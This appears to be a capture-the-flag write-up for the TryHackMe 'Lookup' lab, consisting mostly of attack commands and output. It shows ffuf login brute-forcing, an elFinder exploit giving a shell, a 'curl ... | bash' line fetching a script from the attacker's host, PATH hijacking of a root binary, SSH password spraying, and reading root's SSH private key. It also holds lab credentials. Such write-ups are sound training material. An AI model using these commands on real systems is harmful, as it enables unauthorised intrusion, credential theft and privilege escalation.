---
title: Lookup
description: 'Using FFUF to brute force a user name and password and abusing a binary to read files as root'
pubDate: 2024-12-16
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1732205261742'
---

```bash
ffuf -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fs 62
...[snip]...
password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 26ms]
```

```bash
ffuf -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=FUZZ&password=password123' -w /usr/share/wordlists/rockyou.txt -fs 74
...[snip]...
jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
```

https://www.exploit-db.com/exploits/46481

```bash
python2 elfinder.py http://files.lookup.thm/elFinder/
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

User on the box and in `credentials.txt`: `think : nopassword`

```bash
curl http://10.8.28.13:8000/moo.sh | bash
```


## USER

Looking at the source code of the `pwm` binary we see that it tries to get the username from the `id` command, but it doesn't use an absolute path.
We can abuse this by creating our own `id` command and echoing whatever we want:

```bash
echo 'uid=1000(think) gid=1000(think) groups=1000(think)' > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
cd /tmp
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
...[snip]...
```

This looks like a list of passwords possibly for the `think` user.
Lets save them to our machine (`passwords.txt`) and try them on the `think` user.

```bash
netexec ssh lookup.thm -u think -p passwords.txt
SSH         10.10.213.121   22     lookup.thm       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.213.121   22     lookup.thm       [-] think:jose1006
SSH         10.10.213.121   22     lookup.thm       [-] think:jose1004
...[snip]...
SSH         10.10.213.121   22     lookup.thm       [+] think:josemario.AKA(think)  Linux - Shell access!
```

A valid SSH password for `think` is `josemario.AKA(think)`, lets log in:

```bash
ssh think@lookup.thm # <-- josemario.AKA(think)
```

## ROOT

Since the `pwm` binary gets execute with root permissions we can abuse it again.
But instead of reading the `.passwords` file in the `think` users home directory we create a symlink to the `id_rsa` file of root:

```bash
mv .passwords .passwords_bak
think@lookup:~$ ln -s /root/.ssh/id_rsa .passwords
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...[snip]...
```

Now we can login as root with this key file:

```bash
ssh -i root_id_rsa root@lookup.thm
```

### Alternative way

Checking the sudo permissions we find this we can execute `look` as root:

```bash
sudo -l
[sudo] password for think:
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

Looking this up on GTFOBins (https://gtfobins.github.io/gtfobins/look/#sudo) we find a way to read files as root, lets read the `id_rsa` file:

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...[snip]...
```
